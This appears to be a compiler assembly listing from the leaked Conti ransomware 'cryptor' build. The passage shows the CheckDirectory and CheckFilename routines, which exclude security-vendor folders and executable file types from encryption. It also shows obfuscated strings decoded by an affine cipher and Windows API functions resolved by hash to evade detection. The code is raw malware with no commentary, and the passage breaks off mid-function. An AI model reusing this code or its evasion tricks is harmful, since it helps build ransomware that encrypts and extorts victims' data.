  007af	4c 8b c3	 mov	 r8, rbx
  007b2	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL532@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  007c0	42 0f b6 4c 05
	a1		 movzx	 ecx, BYTE PTR $T10[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  007c6	b8 0b 00 00 00	 mov	 eax, 11
  007cb	2b c1		 sub	 eax, ecx
  007cd	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  007d0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  007d5	f7 e9		 imul	 ecx
  007d7	03 d1		 add	 edx, ecx
  007d9	c1 fa 06	 sar	 edx, 6
  007dc	8b c2		 mov	 eax, edx
  007de	c1 e8 1f	 shr	 eax, 31
  007e1	03 d0		 add	 edx, eax
  007e3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  007e6	2b c8		 sub	 ecx, eax
  007e8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  007ed	83 c1 7f	 add	 ecx, 127		; 0000007fH
  007f0	f7 e9		 imul	 ecx
  007f2	03 d1		 add	 edx, ecx
  007f4	c1 fa 06	 sar	 edx, 6
  007f7	8b c2		 mov	 eax, edx
  007f9	c1 e8 1f	 shr	 eax, 31
  007fc	03 d0		 add	 edx, eax
  007fe	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00801	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00803	42 88 4c 05 a1	 mov	 BYTE PTR $T10[rbp+r8-255], cl
  00808	49 ff c0	 inc	 r8
  0080b	49 83 f8 18	 cmp	 r8, 24
  0080f	72 af		 jb	 SHORT $LL532@CheckDirec
$LN531@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 54   : 		OBFW(L"Trend Micro"),

  00811	48 8d 45 a1	 lea	 rax, QWORD PTR $T10[rbp-255]
  00815	48 89 85 88 00
	00 00		 mov	 QWORD PTR BlackList$[rbp-184], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0081c	88 5d 88	 mov	 BYTE PTR $T11[rbp-256], bl
  0081f	c6 45 89 57	 mov	 BYTE PTR $T11[rbp-255], 87 ; 00000057H
  00823	c6 45 8a 76	 mov	 BYTE PTR $T11[rbp-254], 118 ; 00000076H
  00827	c6 45 8b 05	 mov	 BYTE PTR $T11[rbp-253], 5
  0082b	c6 45 8c 76	 mov	 BYTE PTR $T11[rbp-252], 118 ; 00000076H
  0082f	c6 45 8d 7d	 mov	 BYTE PTR $T11[rbp-251], 125 ; 0000007dH
  00833	c6 45 8e 76	 mov	 BYTE PTR $T11[rbp-250], 118 ; 00000076H
  00837	c6 45 8f 18	 mov	 BYTE PTR $T11[rbp-249], 24
  0083b	c6 45 90 76	 mov	 BYTE PTR $T11[rbp-248], 118 ; 00000076H
  0083f	c6 45 91 0b	 mov	 BYTE PTR $T11[rbp-247], 11
  00843	c6 45 92 76	 mov	 BYTE PTR $T11[rbp-246], 118 ; 00000076H
  00847	c6 45 93 44	 mov	 BYTE PTR $T11[rbp-245], 68 ; 00000044H
  0084b	c6 45 94 76	 mov	 BYTE PTR $T11[rbp-244], 118 ; 00000076H
  0084f	c6 45 95 2b	 mov	 BYTE PTR $T11[rbp-243], 43 ; 0000002bH
  00853	c6 45 96 76	 mov	 BYTE PTR $T11[rbp-242], 118 ; 00000076H
  00857	c6 45 97 11	 mov	 BYTE PTR $T11[rbp-241], 17
  0085b	c6 45 98 76	 mov	 BYTE PTR $T11[rbp-240], 118 ; 00000076H
  0085f	c6 45 99 76	 mov	 BYTE PTR $T11[rbp-239], 118 ; 00000076H
  00863	c6 45 9a 76	 mov	 BYTE PTR $T11[rbp-238], 118 ; 00000076H
  00867	0f b6 45 89	 movzx	 eax, BYTE PTR $T11[rbp-255]

; 58   :         return m_isDecrypted;

  0086b	0f b6 45 88	 movzx	 eax, BYTE PTR $T11[rbp-256]

; 63   :         if (!isDecrypted())

  0086f	84 c0		 test	 al, al
  00871	75 61		 jne	 SHORT $LN581@CheckDirec

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00873	4c 8b c3	 mov	 r8, rbx
  00876	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL582@CheckDirec:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00880	42 0f b6 4c 05
	89		 movzx	 ecx, BYTE PTR $T11[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00886	b8 76 00 00 00	 mov	 eax, 118		; 00000076H
  0088b	2b c1		 sub	 eax, ecx
  0088d	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00890	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00895	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  00898	f7 e9		 imul	 ecx
  0089a	03 d1		 add	 edx, ecx
  0089c	c1 fa 06	 sar	 edx, 6
  0089f	8b c2		 mov	 eax, edx
  008a1	c1 e8 1f	 shr	 eax, 31
  008a4	03 d0		 add	 edx, eax
  008a6	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  008a9	2b c8		 sub	 ecx, eax
  008ab	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  008b0	83 c1 7f	 add	 ecx, 127		; 0000007fH
  008b3	f7 e9		 imul	 ecx
  008b5	03 d1		 add	 edx, ecx
  008b7	c1 fa 06	 sar	 edx, 6
  008ba	8b c2		 mov	 eax, edx
  008bc	c1 e8 1f	 shr	 eax, 31
  008bf	03 d0		 add	 edx, eax
  008c1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  008c4	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  008c6	42 88 4c 05 89	 mov	 BYTE PTR $T11[rbp+r8-255], cl
  008cb	49 ff c0	 inc	 r8
  008ce	49 83 f8 12	 cmp	 r8, 18
  008d2	72 ac		 jb	 SHORT $LL582@CheckDirec
$LN581@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 55   : 		OBFW(L"perflogs")

  008d4	48 8d 45 89	 lea	 rax, QWORD PTR $T11[rbp-255]
  008d8	48 89 85 90 00
	00 00		 mov	 QWORD PTR BlackList$[rbp-176], rax
  008df	90		 npad	 1
$LL4@CheckDirec:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  008e0	ba 16 00 00 00	 mov	 edx, 22
  008e5	41 b8 61 fe ae
	f8		 mov	 r8d, -122749343		; f8aefe61H
  008eb	44 8d 4a 01	 lea	 r9d, QWORD PTR [rdx+1]
  008ef	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1007 : 	return pFunction(pszFirst, pszSrch);

  008f4	48 8b 54 dd 40	 mov	 rdx, QWORD PTR BlackList$[rbp+rbx*8-256]
  008f9	48 8b cf	 mov	 rcx, rdi
  008fc	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 61   : 		if (pStrStrIW(Directory, BlackList[i])) {

  008fe	48 85 c0	 test	 rax, rax
  00901	75 10		 jne	 SHORT $LN603@CheckDirec

; 56   : 
; 57   : 	};
; 58   : 
; 59   : 	INT Count = sizeof(BlackList) / sizeof(LPWSTR);
; 60   : 	for (INT i = 0; i < Count; i++) {

  00903	48 ff c3	 inc	 rbx
  00906	48 83 fb 0b	 cmp	 rbx, 11
  0090a	7c d4		 jl	 SHORT $LL4@CheckDirec

; 63   : 		}
; 64   : 	}
; 65   : 
; 66   : 	return TRUE;

  0090c	b8 01 00 00 00	 mov	 eax, 1
  00911	eb 02		 jmp	 SHORT $LN1@CheckDirec
$LN603@CheckDirec:

; 62   : 			return FALSE;

  00913	33 c0		 xor	 eax, eax
$LN1@CheckDirec:

; 67   : }

  00915	4c 8d 9c 24 a0
	01 00 00	 lea	 r11, QWORD PTR [rsp+416]
  0091d	49 8b 5b 10	 mov	 rbx, QWORD PTR [r11+16]
  00921	49 8b 7b 18	 mov	 rdi, QWORD PTR [r11+24]
  00925	49 8b e3	 mov	 rsp, r11
  00928	5d		 pop	 rbp
  00929	c3		 ret	 0
?CheckDirectory@@YAHPEB_W@Z ENDP			; CheckDirectory
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?CheckFilename@@YAHPEB_W@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 48
$T3 = 64
$T4 = 80
$T5 = 96
$T8 = 112
$T6 = 128
$T7 = 152
BlackList$ = 192
FileName$ = 272
?CheckFilename@@YAHPEB_W@Z PROC				; CheckFilename, COMDAT

; 72   : {

$LN394:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 7c 24 10	 mov	 QWORD PTR [rsp+16], rdi
  0000a	55		 push	 rbp
  0000b	48 8d 6c 24 a9	 lea	 rbp, QWORD PTR [rsp-87]
  00010	48 81 ec 00 01
	00 00		 sub	 rsp, 256		; 00000100H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00017	c6 44 24 20 00	 mov	 BYTE PTR $T1[rsp], 0

; 63   :         if (!isDecrypted())

  0001c	33 db		 xor	 ebx, ebx

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0001e	c6 44 24 21 0e	 mov	 BYTE PTR $T1[rsp+1], 14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 72   : {

  00023	48 8b f9	 mov	 rdi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00026	c6 44 24 22 55	 mov	 BYTE PTR $T1[rsp+2], 85	; 00000055H
  0002b	c6 44 24 23 5c	 mov	 BYTE PTR $T1[rsp+3], 92	; 0000005cH
  00030	c6 44 24 24 55	 mov	 BYTE PTR $T1[rsp+4], 85	; 00000055H
  00035	c6 44 24 25 52	 mov	 BYTE PTR $T1[rsp+5], 82	; 00000052H
  0003a	c6 44 24 26 55	 mov	 BYTE PTR $T1[rsp+6], 85	; 00000055H
  0003f	c6 44 24 27 5c	 mov	 BYTE PTR $T1[rsp+7], 92	; 0000005cH
  00044	c6 44 24 28 55	 mov	 BYTE PTR $T1[rsp+8], 85	; 00000055H
  00049	c6 45 80 55	 mov	 BYTE PTR $T1[rbp-160], 85 ; 00000055H
  0004d	c6 45 81 55	 mov	 BYTE PTR $T1[rbp-159], 85 ; 00000055H
  00051	0f b6 44 24 21	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  00056	0f b6 44 24 20	 movzx	 eax, BYTE PTR $T1[rsp]

; 63   :         if (!isDecrypted())

  0005b	84 c0		 test	 al, al
  0005d	75 65		 jne	 SHORT $LN34@CheckFilen

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0005f	44 8b c3	 mov	 r8d, ebx
  00062	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL35@CheckFilen:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00070	42 0f b6 4c 04
	21		 movzx	 ecx, BYTE PTR $T1[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00076	b8 55 00 00 00	 mov	 eax, 85			; 00000055H
  0007b	2b c1		 sub	 eax, ecx
  0007d	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00080	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00085	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  00088	f7 e9		 imul	 ecx
  0008a	03 d1		 add	 edx, ecx
  0008c	c1 fa 06	 sar	 edx, 6
  0008f	8b c2		 mov	 eax, edx
  00091	c1 e8 1f	 shr	 eax, 31
  00094	03 d0		 add	 edx, eax
  00096	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00099	2b c8		 sub	 ecx, eax
  0009b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  000a0	83 c1 7f	 add	 ecx, 127		; 0000007fH
  000a3	f7 e9		 imul	 ecx
  000a5	03 d1		 add	 edx, ecx
  000a7	c1 fa 06	 sar	 edx, 6
  000aa	8b c2		 mov	 eax, edx
  000ac	c1 e8 1f	 shr	 eax, 31
  000af	03 d0		 add	 edx, eax
  000b1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000b4	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000b6	42 88 4c 04 21	 mov	 BYTE PTR $T1[rsp+r8+1], cl
  000bb	49 ff c0	 inc	 r8
  000be	49 83 f8 0a	 cmp	 r8, 10
  000c2	72 ac		 jb	 SHORT $LL35@CheckFilen
$LN34@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 76   : 		OBFW(L".exe"),

  000c4	48 8d 44 24 21	 lea	 rax, QWORD PTR $T1[rsp+1]
  000c9	48 89 45 17	 mov	 QWORD PTR BlackList$[rbp-169], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  000cd	88 5d 87	 mov	 BYTE PTR $T2[rbp-169], bl
  000d0	c6 45 88 1a	 mov	 BYTE PTR $T2[rbp-168], 26
  000d4	c6 45 89 50	 mov	 BYTE PTR $T2[rbp-167], 80 ; 00000050H
  000d8	c6 45 8a 3e	 mov	 BYTE PTR $T2[rbp-166], 62 ; 0000003eH
  000dc	c6 45 8b 50	 mov	 BYTE PTR $T2[rbp-165], 80 ; 00000050H
  000e0	c6 45 8c 19	 mov	 BYTE PTR $T2[rbp-164], 25
  000e4	c6 45 8d 50	 mov	 BYTE PTR $T2[rbp-163], 80 ; 00000050H
  000e8	c6 45 8e 19	 mov	 BYTE PTR $T2[rbp-162], 25
  000ec	c6 45 8f 50	 mov	 BYTE PTR $T2[rbp-161], 80 ; 00000050H
  000f0	c6 45 90 50	 mov	 BYTE PTR $T2[rbp-160], 80 ; 00000050H
  000f4	c6 45 91 50	 mov	 BYTE PTR $T2[rbp-159], 80 ; 00000050H
  000f8	0f b6 45 88	 movzx	 eax, BYTE PTR $T2[rbp-168]

; 58   :         return m_isDecrypted;

  000fc	0f b6 45 87	 movzx	 eax, BYTE PTR $T2[rbp-169]

; 63   :         if (!isDecrypted())

  00100	84 c0		 test	 al, al
  00102	75 5d		 jne	 SHORT $LN68@CheckFilen

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00104	4c 8b c3	 mov	 r8, rbx
  00107	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL69@CheckFilen:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00110	42 0f b6 4c 05
	88		 movzx	 ecx, BYTE PTR $T2[rbp+r8-168]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00116	b8 50 00 00 00	 mov	 eax, 80			; 00000050H
  0011b	2b c1		 sub	 eax, ecx
  0011d	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00120	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00125	f7 e9		 imul	 ecx
  00127	03 d1		 add	 edx, ecx
  00129	c1 fa 06	 sar	 edx, 6
  0012c	8b c2		 mov	 eax, edx
  0012e	c1 e8 1f	 shr	 eax, 31
  00131	03 d0		 add	 edx, eax
  00133	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00136	2b c8		 sub	 ecx, eax
  00138	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0013d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00140	f7 e9		 imul	 ecx
  00142	03 d1		 add	 edx, ecx
  00144	c1 fa 06	 sar	 edx, 6
  00147	8b c2		 mov	 eax, edx
  00149	c1 e8 1f	 shr	 eax, 31
  0014c	03 d0		 add	 edx, eax
  0014e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00151	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00153	42 88 4c 05 88	 mov	 BYTE PTR $T2[rbp+r8-168], cl
  00158	49 ff c0	 inc	 r8
  0015b	49 83 f8 0a	 cmp	 r8, 10
  0015f	72 af		 jb	 SHORT $LL69@CheckFilen
$LN68@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 77   : 		OBFW(L".dll"),

  00161	48 8d 45 88	 lea	 rax, QWORD PTR $T2[rbp-168]
  00165	48 89 45 1f	 mov	 QWORD PTR BlackList$[rbp-161], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00169	88 5d 97	 mov	 BYTE PTR $T3[rbp-169], bl
  0016c	c6 45 98 42	 mov	 BYTE PTR $T3[rbp-168], 66 ; 00000042H
  00170	c6 45 99 13	 mov	 BYTE PTR $T3[rbp-167], 19
  00174	c6 45 9a 29	 mov	 BYTE PTR $T3[rbp-166], 41 ; 00000029H
  00178	c6 45 9b 13	 mov	 BYTE PTR $T3[rbp-165], 19
  0017c	c6 45 9c 20	 mov	 BYTE PTR $T3[rbp-164], 32 ; 00000020H
  00180	c6 45 9d 13	 mov	 BYTE PTR $T3[rbp-163], 19
  00184	c6 45 9e 6d	 mov	 BYTE PTR $T3[rbp-162], 109 ; 0000006dH
  00188	c6 45 9f 13	 mov	 BYTE PTR $T3[rbp-161], 19
  0018c	c6 45 a0 13	 mov	 BYTE PTR $T3[rbp-160], 19
  00190	c6 45 a1 13	 mov	 BYTE PTR $T3[rbp-159], 19
  00194	0f b6 45 98	 movzx	 eax, BYTE PTR $T3[rbp-168]

; 58   :         return m_isDecrypted;

  00198	0f b6 45 97	 movzx	 eax, BYTE PTR $T3[rbp-169]

; 63   :         if (!isDecrypted())

  0019c	84 c0		 test	 al, al
  0019e	75 65		 jne	 SHORT $LN102@CheckFilen

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  001a0	4c 8b cb	 mov	 r9, rbx
  001a3	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL103@CheckFilen:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001b0	42 0f b6 4c 0d
	98		 movzx	 ecx, BYTE PTR $T3[rbp+r9-168]

; 40   :     return (a % n + n) % n;

  001b6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  001bb	83 e9 13	 sub	 ecx, 19
  001be	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  001c2	41 f7 e8	 imul	 r8d
  001c5	41 03 d0	 add	 edx, r8d
  001c8	c1 fa 06	 sar	 edx, 6
  001cb	8b c2		 mov	 eax, edx
  001cd	c1 e8 1f	 shr	 eax, 31
  001d0	03 d0		 add	 edx, eax
  001d2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  001d5	44 2b c0	 sub	 r8d, eax
  001d8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  001dd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  001e1	41 f7 e8	 imul	 r8d
  001e4	41 03 d0	 add	 edx, r8d
  001e7	c1 fa 06	 sar	 edx, 6
  001ea	8b c2		 mov	 eax, edx
  001ec	c1 e8 1f	 shr	 eax, 31
  001ef	03 d0		 add	 edx, eax
  001f1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  001f4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001f7	46 88 44 0d 98	 mov	 BYTE PTR $T3[rbp+r9-168], r8b
  001fc	49 ff c1	 inc	 r9
  001ff	49 83 f9 0a	 cmp	 r9, 10
  00203	72 ab		 jb	 SHORT $LL103@CheckFilen
$LN102@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 78   : 		OBFW(L".lnk"),

  00205	48 8d 45 98	 lea	 rax, QWORD PTR $T3[rbp-168]
  00209	48 89 45 27	 mov	 QWORD PTR BlackList$[rbp-153], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0020d	88 5d a7	 mov	 BYTE PTR $T4[rbp-169], bl
  00210	c6 45 a8 3d	 mov	 BYTE PTR $T4[rbp-168], 61 ; 0000003dH
  00214	c6 45 a9 46	 mov	 BYTE PTR $T4[rbp-167], 70 ; 00000046H
  00218	c6 45 aa 6f	 mov	 BYTE PTR $T4[rbp-166], 111 ; 0000006fH
  0021c	c6 45 ab 46	 mov	 BYTE PTR $T4[rbp-165], 70 ; 00000046H
  00220	c6 45 ac 1b	 mov	 BYTE PTR $T4[rbp-164], 27
  00224	c6 45 ad 46	 mov	 BYTE PTR $T4[rbp-163], 70 ; 00000046H
  00228	c6 45 ae 6f	 mov	 BYTE PTR $T4[rbp-162], 111 ; 0000006fH
  0022c	c6 45 af 46	 mov	 BYTE PTR $T4[rbp-161], 70 ; 00000046H
  00230	c6 45 b0 46	 mov	 BYTE PTR $T4[rbp-160], 70 ; 00000046H
  00234	c6 45 b1 46	 mov	 BYTE PTR $T4[rbp-159], 70 ; 00000046H
  00238	0f b6 45 a8	 movzx	 eax, BYTE PTR $T4[rbp-168]

; 58   :         return m_isDecrypted;

  0023c	0f b6 45 a7	 movzx	 eax, BYTE PTR $T4[rbp-169]

; 63   :         if (!isDecrypted())

  00240	84 c0		 test	 al, al
  00242	75 61		 jne	 SHORT $LN136@CheckFilen

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00244	4c 8b cb	 mov	 r9, rbx
  00247	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL137@CheckFilen:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00250	42 0f b6 4c 0d
	a8		 movzx	 ecx, BYTE PTR $T4[rbp+r9-168]

; 40   :     return (a % n + n) % n;

  00256	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0025b	83 e9 46	 sub	 ecx, 70			; 00000046H
  0025e	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]

; 40   :     return (a % n + n) % n;

  00262	41 f7 e8	 imul	 r8d
  00265	41 03 d0	 add	 edx, r8d
  00268	c1 fa 06	 sar	 edx, 6
  0026b	8b c2		 mov	 eax, edx
  0026d	c1 e8 1f	 shr	 eax, 31
  00270	03 d0		 add	 edx, eax
  00272	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00275	44 2b c0	 sub	 r8d, eax
  00278	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0027d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00281	41 f7 e8	 imul	 r8d
  00284	41 03 d0	 add	 edx, r8d
  00287	c1 fa 06	 sar	 edx, 6
  0028a	8b c2		 mov	 eax, edx
  0028c	c1 e8 1f	 shr	 eax, 31
  0028f	03 d0		 add	 edx, eax
  00291	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00294	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00297	46 88 44 0d a8	 mov	 BYTE PTR $T4[rbp+r9-168], r8b
  0029c	49 ff c1	 inc	 r9
  0029f	49 83 f9 0a	 cmp	 r9, 10
  002a3	72 ab		 jb	 SHORT $LL137@CheckFilen
$LN136@CheckFilen:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 79   : 		OBFW(L".sys"),

  002a5	48 8d 45 a8	 lea	 rax, QWORD PTR $T4[rbp-168]
  002a9	48 89 45 2f	 mov	 QWORD PTR BlackList$[rbp-145], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  002ad	88 5d b7	 mov	 BYTE PTR $T5[rbp-169], bl
  002b0	c6 45 b8 1f	 mov	 BYTE PTR $T5[rbp-168], 31
  002b4	c6 45 b9 17	 mov	 BYTE PTR $T5[rbp-167], 23
  002b8	c6 45 ba 35	 mov	 BYTE PTR $T5[rbp-166], 53 ; 00000035H
  002bc	c6 45 bb 17	 mov	 BYTE PTR $T5[rbp-165], 23
  002c0	c6 45 bc 2b	 mov	 BYTE PTR $T5[rbp-164], 43 ; 0000002bH
  002c4	c6 45 bd 17	 mov	 BYTE PTR $T5[rbp-163], 23
  002c8	c6 45 be 66	 mov	 BYTE PTR $T5[rbp-162], 102 ; 00000066H
  002cc	c6 45 bf 17	 mov	 BYTE PTR $T5[rbp-161], 23
  002d0	c6 45 c0 17	 mov	 BYTE PTR $T5[rbp-160], 23
  002d4	c6 45 c1 17	 mov	 BYTE PTR $T5[rbp-159], 23
  002d8	0f b6 45 b8	 movzx	 eax, BYTE PTR $T5[rbp-168]

; 58   :         return m_isDecrypted;

  002dc	0f b6 45 b7	 movzx	 eax, BYTE PTR $T5[rbp-169]

; 63   :         if (!isDecrypted())

  002e0	84 c0		 test	 al, al
  002e2	75 5d		 jne	 SHORT $LN170@CheckFilen

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  002e4	4c 8b c3	 mov	 r8, rbx
  002e7	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL171@CheckFilen:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002f0	42 0f b6 4c 05
	b8		 movzx	 ecx, BYTE PTR $T5[rbp+r8-168]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  002f6	b8 17 00 00 00	 mov	 eax, 23
  002fb	2b c1		 sub	 eax, ecx
  002fd	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00300	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00305	f7 e9		 imul	 ecx
  00307	03 d1		 add	 edx, ecx
  00309	c1 fa 06	 sar	 edx, 6
  0030c	8b c2		 mov	 eax, edx
  0030e	c1 e8 1f	 shr	 eax, 31
  00311	03 d0		 add	 edx, eax
  00313	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
